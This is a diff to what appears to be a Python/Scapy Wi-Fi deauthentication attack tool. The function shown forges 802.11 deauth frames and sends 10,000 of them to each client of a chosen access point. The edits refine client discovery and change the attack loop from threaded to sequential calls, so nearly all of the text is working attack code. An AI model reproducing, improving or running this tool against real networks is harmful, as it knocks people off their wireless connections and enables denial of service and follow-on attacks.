@@ -38,7 +38,7 @@ def DeauthAttack(interface, device_target, client_target):
 	'''
 	DeauthAttack function - Start the deauth attack by given interface, AP mac address and client MAC address.
 	'''
-	print 'HELLO WORLD'
+	print 'Deauthing',client_target,'from',device_target,'...'
 	pkt = RadioTap() / Dot11( addr1 = client_target, addr2 = device_target, addr3 = device_target, type=0, subtype= 12) / Dot11Deauth()
 	sendp(pkt, iface = interface, count = 10000, inter = .2)
 
@@ -98,7 +98,7 @@ def PacketHandler(pkt):
 			src = pkt.addr2
 			dest = pkt.addr3
 			if(dest in devices.keys()):
-				if((src not in clients.keys()) and (src != dest)):
+				if((src not in clients.keys()) and (src != dest) and (src not in devices.keys())):
 					clients[src] = devices[dest]
 					flag = 1
 		if(flag):
@@ -125,6 +125,7 @@ def Interface():
 	'''
 	Interface function - The main function that controls the flow of the attack. It calls other functions and combines all of them.
 	'''
+	#workers = []
 	try:
 		Welcome()
 		interface = Device_Interface()
@@ -147,31 +148,31 @@ def Interface():
 					break
 			
 			Display_Clients(device_target)
+			#client_target = raw_input("\nPlease choose Client MAC Address (For example: 00:18:25:16:72:b0):")
+			#if(client_target == "exit" or choise == "quit"):
+			#	Exit()
+			#if(client_target not in clients.keys()):
+			#	print("Bad Device MAC Address")
+			#else:
 			while(1):
-				#client_target = raw_input("\nPlease choose Client MAC Address (For example: 00:18:25:16:72:b0):")
-				#if(client_target == "exit" or choise == "quit"):
-				#	Exit()
-				#if(client_target not in clients.keys()):
-				#	print("Bad Device MAC Address")
-				#else:
 				for client in clients:
 					if(clients[client] == devices[device_target]):
 						print(client + " : " + device_target)
-						t = threading.Thread(target=DeauthAttack, args = (interface, device_target, client))
+						#t = threading.Thread(target=DeauthAttack, args = (interface, device_target, client))
+						#workers.append(t)
 						#t.daemon = True
-						t.start()
-						#DeauthAttack(interface, device_target, client)
-						
-				break
-				time.sleep(100)
-
-		else:
-			print("Devices \ Clients Tables is null\n")
-		Exit()
-
-	except KeyboardInterrupt:
-		print ("\nInterruption detected.\n")
+						DeauthAttack(interface, device_target, client)
 		
+		#for worker in workers:
+		#	worker.start()
+		#while(True):
+		#	time.sleep(100)
+
+	except KeyboardInterrupt:	
+		print ("\nInterruption detected.\n")
+		#for worker in workers:
+			#worker.kill()
+		#	worker.join(10)	
 		exit()
 
 if __name__ == '__main__':
